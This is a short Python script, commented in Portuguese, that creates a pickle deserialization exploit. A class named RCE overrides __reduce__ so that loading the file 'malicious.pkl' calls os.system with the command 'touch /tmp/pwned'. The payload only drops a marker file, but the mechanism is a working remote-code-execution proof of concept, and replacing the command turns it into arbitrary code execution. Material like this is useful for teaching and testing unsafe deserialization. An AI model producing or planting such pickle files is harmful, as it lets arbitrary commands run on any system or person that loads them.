import pickle
import os

class RCE:
    def __reduce__(self):
        # O método __reduce__ é chamado pelo pickle.
        # Ele retorna uma tupla contendo:
        # 1. Uma função a ser chamada (neste caso, os.system)
        # 2. Uma tupla com os argumentos para essa função (o comando a ser executado)
        cmd = 'touch /tmp/pwned'
        return (os.system, (cmd,))

# Cria uma instância da nossa classe maliciosa
exploit = RCE()

# Serializa o objeto para um arquivo usando pickle
with open('malicious.pkl', 'wb') as f:
    pickle.dump(exploit, f)

print("Arquivo 'malicious.pkl' criado com sucesso.")
